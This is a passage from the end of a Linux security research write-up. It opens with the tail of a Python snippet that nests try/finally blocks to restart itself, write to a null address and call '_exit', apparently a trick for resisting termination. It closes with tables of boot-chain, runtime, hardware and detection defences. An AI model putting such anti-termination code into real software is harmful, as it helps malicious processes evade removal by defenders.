        try:raise(SystemExit((0,_start(None),_start(NotImplemented),_start(...),_start(_),_start(0),_start(1),_start(__name__),1)[0]))
        finally:
            try:raise(SystemError((0,memset(0,1,1),0,_exit(0),0)[0]))
            finally:raise(SystemExit(0))
```

</details>

---

## 27. Defense Recommendations

### 27.1 Boot Chain Protection

| Measure | Implementation |
|---------|----------------|
| **Secure Boot** | Enable UEFI Secure Boot with custom keys |
| **Measured Boot** | TPM 2.0 with PCR policy enforcement |
| **GRUB Password** | Set `superusers` and password in `grub.cfg` |
| **Kernel Lockdown** | `lockdown=confidentiality` kernel parameter |
| **Initrd Verification** | Sign initrd with GPG/IMA |
| **SPI Write Protection** | Set BIOS/UEFI write protect ranges |

### 27.2 Runtime Protection

| Measure | Implementation |
|---------|----------------|
| **SELinux/AppArmor** | Enforce mandatory access control |
| **Kernel Hardening** | `kptr_restrict=2`, `dmesg_restrict=1`, `perf_event_paranoid=3` |
| **ASLR** | `randomize_va_space=2` |
| **Ptrace Restrictions** | `ptrace_scope=3` |
| **Module Signing** | Require signed kernel modules |
| **Read-only Mounts** | Mount `/boot`, `/etc`, `/usr` as read-only |

### 27.3 Hardware Protection

| Measure | Implementation |
|---------|----------------|
| **SPI Flash Protection** | Enable BIOS write protection, set protected ranges |
| **Boot Guard** | Intel Boot Guard with verified boot policy |
| **TPM-based Sealing** | Seal secrets to PCR values |
| **Physical Security** | Lock chassis, disable external programmers (SPI, JTAG) |

### 27.4 Detection & Response

| Measure | Implementation |
|---------|----------------|
| **File Integrity Monitoring** | AIDE, Tripwire |
| **Audit Logging** | `auditd` with remote syslog |
| **EDR/XDR** | CrowdStrike, SentinelOne |
| **Anomaly Detection** | Monitor sysctl changes, module loads, mount operations |
| **Immutable Infrastructure** | Use read-only root filesystems |

---

<div align="center">

**[⬆ Back to Top](#-linux-resilience-research-complete-technical-analysis)**

*Security Research — Linux System Resilience Analysis*

</div>
